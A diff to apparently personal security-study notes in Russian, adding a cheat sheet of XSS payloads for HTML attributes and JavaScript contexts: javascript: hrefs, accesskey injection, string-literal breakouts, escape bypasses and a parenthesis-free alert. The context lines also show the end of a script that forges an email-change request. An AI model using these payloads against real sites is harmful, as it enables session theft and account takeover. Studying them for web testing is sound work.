@@ -4,6 +4,8 @@
 # Навигация
 
 > [[XSS#Exploiting cross-site scripting to steal cookies|1. Exploiting cross-site scripting to steal cookies]]
+> [[XSS#XSS в HTML атрибутах|2. XSS в HTML атрибутах]]
+> > [[XSS### XSS into JavaScript|3. ## XSS into JavaScript]]
 ***
 # Exploiting cross-site scripting to steal cookies
 
@@ -39,3 +41,30 @@ changeReq.send('csrf='+token+'&email=test@test.com')
 };  
 </script>
 ```
+
+# XSS в HTML атрибутах
+
+[portswigger.net/XSS/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+1. Через intruder проверить не заблокированные теги и атрибуты.
+2. Если ввод попадает в href, можно использовать следующую конструкцию `javascript:alert(1)`. Выйдет следующее: 
+`<a href="javascript:alert(document.domain)">`
+3. Проверь атрибут `accesskey`. Пример: 
+`https://web-site/?%27accesskey=%27x%27onclick=%27alert(1)`; где `%27` = `'`. 
+Скрипт сработает при нажатии:
+- On Windows: `ALT+SHIFT+X` / `ALT+X`
+- On MacOS: `CTRL+ALT+X`
+- On Linux: `Alt+X`
+# XSS into JavaScript
+Если ввод попадает в скрипт внутри HTML:
+1. Попытаться закрыть тег предыдущего скрипта и открыть новый: `</script><img src=1 onerror=alert(document.domain)>`
+2. Если ввод находится в литералах : \` \`, ' ', " ", стоит попытаться выйти из них:
+	```
+	'-alert(document.domain)-'
+	';alert(document.domain)//
+	```
+	
+	2.1. Если литералы экранируются, стоит проверить экранацию косой черты: \\ : ``\';alert(document.domain)//``
+	2.2. Если косая черта экранируется, можно закодировать литерал, скорее всего в HTML кодировку: 
+	`&apos;-alert(document.domain)-&apos;`
+	2.3. Использовать конструкцию \${}: `${alert(document.domain)}`
+1. Если запрещены круглые скобки, можно передавать аргументы в функции через конструкцию: `onerror=alert;throw 1`
